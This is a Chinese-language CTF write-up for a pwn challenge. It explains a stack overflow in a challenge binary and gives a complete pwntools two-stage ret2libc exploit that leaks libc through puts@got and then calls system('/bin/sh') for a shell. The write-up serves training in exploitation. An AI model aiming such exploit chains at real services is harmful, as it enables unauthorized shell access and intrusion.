# week4不会起名的废物

## 题目简述

`func` 在栈上只有 `0x20` 字节缓冲区，却执行 `read(0, buf, 0x50)`，可以覆盖返回地址。二进制开启 NX 和 Full RELRO，但未开启 PIE，也没有可用的栈 Canary；仓库同时提供目标使用的 `libc-2.23.so`。

目标是先泄露 libc 地址，再执行 `system("/bin/sh")`。

## 解题过程

从缓冲区起始到返回地址的准确偏移为：

$$
0x20\text{（buf）}+8\text{（saved rbp）}=0x28.
$$

原 WP 写成 `0x30` 与实际 payload 不一致，应以 `0x28` 为准。第一阶段使用固定地址 `pop rdi; ret`，把 `puts@got` 作为参数传给 `puts@plt`。由于程序使用 `-z now`，GOT 在启动时已经完成解析，泄露值就是 libc 中 `puts` 的实际地址。输出后返回 `func` 的入口 `0x4011fb`，再次触发溢出。

第二阶段由

$$
\text{libc base}=\text{leaked puts}-\text{offset(puts)}
$$

计算基址，再加上所给 libc 中 `system` 与 `/bin/sh` 的偏移。

```python
from pwn import ELF, args, context, flat, process, remote, u64

context.binary = elf = ELF("./main", checksec=False)
libc = ELF("./libc-2.23.so", checksec=False)

if args.REMOTE:
    io = remote(args.HOST, int(args.PORT))
else:
    io = process(elf.path)

offset = 0x28
pop_rdi = 0x40127B
func = 0x4011FB

stage1 = b"A" * offset
stage1 += flat(
    pop_rdi,
    elf.got["puts"],
    elf.plt["puts"],
    func,
)
assert len(stage1) <= 0x50

io.sendafter(b"GOT?\n", stage1)
leaked_puts = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc.address = leaked_puts - libc.symbols["puts"]

system = libc.symbols["system"]
bin_sh = next(libc.search(b"/bin/sh\x00"))

stage2 = b"A" * offset
stage2 += flat(pop_rdi, bin_sh, system)
assert len(stage2) <= 0x50

io.sendafter(b"GOT?\n", stage2)
io.interactive()
```

远程地址通过参数传入，例如：

```text
python exp.py REMOTE HOST=example.com PORT=10004
```

若在不同 glibc 环境中进入 `system` 时因 `movaps` 崩溃，应在第二阶段加入一个单独的 `ret` 调整 16 字节栈对齐；题目提供的 libc 与原利用链可以直接工作。

## 方法总结

这是标准两阶段 ret2libc：第一次泄露已解析的 `puts@got` 并回到漏洞函数，第二次用对应 libc 计算出的 `system` 和 `/bin/sh` 完成调用。关键校验点是返回地址偏移 `0x28`、单次输入上限 `0x50`，以及 libc 文件必须与目标一致。
